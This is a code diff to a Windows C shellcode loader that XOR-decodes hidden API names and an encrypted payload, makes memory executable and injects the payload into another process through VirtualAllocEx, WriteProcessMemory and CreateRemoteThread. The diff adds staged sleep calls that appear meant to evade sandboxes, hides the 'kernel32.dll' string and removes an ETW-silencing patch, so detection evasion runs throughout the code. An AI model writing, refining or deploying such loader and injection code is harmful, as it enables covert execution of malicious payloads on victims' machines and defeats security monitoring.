@@ -8,6 +8,26 @@
 #pragma comment (lib, "advapi32")
 #include <psapi.h>
 
+static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");
+
+static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");
+
+
+static void SleepShort(float milliseconds) {
+    static bool once = true;
+    if (once) {
+        ULONG actualResolution;
+        ZwSetTimerResolution(1, true, &actualResolution);
+        once = false;
+    }
+
+    LARGE_INTEGER interval;
+    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
+    NtDelayExecution(false, &interval);
+}
+
+unsigned char dKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
+
 LPVOID (WINAPI * Virt_Alloc)(  LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 
 char XOR_VARIABLE []= "XOR_KEY";
@@ -56,7 +76,7 @@ int bRandom2(const char *procname) {
         pe32.dwSize = sizeof(PROCESSENTRY32); 
                 
         if (!Process32First(hProcSnap, &pe32)) {
-                CloseHandle(hProcSnap);
+//                CloseHandle(hProcSnap);
                 return 0;
         }
                 
@@ -75,23 +95,22 @@ int bRandom2(const char *procname) {
 
 int cRandom3(HANDLE hProc, unsigned char * eRandom5, unsigned int eRandom5_len) {
 
-        LPVOID pRemoteCode = NULL;
+        LPVOID pRemteCode = NULL;
         HANDLE hThread = NULL;
 
   
-        pRemoteCode = VirtualAllocEx(hProc, NULL, eRandom5_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-        WriteProcessMemory(hProc, pRemoteCode, (PVOID)eRandom5, (SIZE_T)eRandom5_len, (SIZE_T *)NULL);
+        pRemteCode = VirtualAllocEx(hProc, NULL, eRandom5_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+        WriteProcessMemory(hProc, pRemteCode, (PVOID)eRandom5, (SIZE_T)eRandom5_len, (SIZE_T *)NULL);
         
-        hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
+        hThread = CreateRemoteThread(hProc, NULL, 0, pRemteCode, NULL, 0, NULL);
         if (hThread != NULL) {
                 WaitForSingleObject(hThread, 500);
-                CloseHandle(hThread);
                 return 0;
         }
         return -1;
 }
 
-void gRandom7(char * tada, int tada_len, char * XOR_VARIABLE, size_t XOR_VARIABLE_len) {
+void gRandom7(char * tada, size_t tada_len, char * XOR_VARIABLE, size_t XOR_VARIABLE_len) {
         int r;
         r = 0;
         for (int i = 0; i < tada_len; i++) {
@@ -116,29 +135,25 @@ int main(void) {
  
 	unsigned int eRandom5_len = sizeof(eRandom5);
 
-	void * addr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
-        VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
-
-        #ifdef _WIN64
-        memcpy(addr, "\x48\x33\xc0\xc3", 4);            
-        #else
-        memcpy(addr, "\x33\xc0\xc2\x14\x00", 5);                
-        #endif  
-
-        VirtualProtect(addr, 4096, oldprotect, &oldprotect);
 
 	FreeConsole;
 
 	gRandom7((char *) fRandom6, sizeof (fRandom6), XOR_VARIABLE, sizeof(XOR_VARIABLE));
-        Virt_Alloc= GetProcAddress(GetModuleHandle("kernel32.dll"), fRandom6);
-
 	
+	SleepShort(3000);
+
+        Virt_Alloc= GetProcAddress(GetModuleHandle(dKernel32), fRandom6);
+
+	SleepShort(4000);
+
 	Random8_mem = Virt_Alloc(0, eRandom5_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	SleepShort(5000);
 	aRandom1((char *) eRandom5, eRandom5_len, dRandom4, sizeof(dRandom4));
 	
-	RtlMoveMemory(Random8_mem, eRandom5, eRandom5_len);
+	RtlCopyMemory(Random8_mem, eRandom5, eRandom5_len);
 	
 	rv = VirtualProtect(Random8_mem, eRandom5_len, PAGE_EXECUTE_READ, &oldprotect);
+	SleepShort(6000);
 
 	gRandom7((char *) Random9, sizeof (Random9), XOR_VARIABLE, sizeof(XOR_VARIABLE));
 	
@@ -152,7 +167,6 @@ int main(void) {
 
 		if (hProc != NULL) {
 			cRandom3(hProc, eRandom5, eRandom5_len);
-			CloseHandle(hProc);
 		}
 	}
 	return 0;
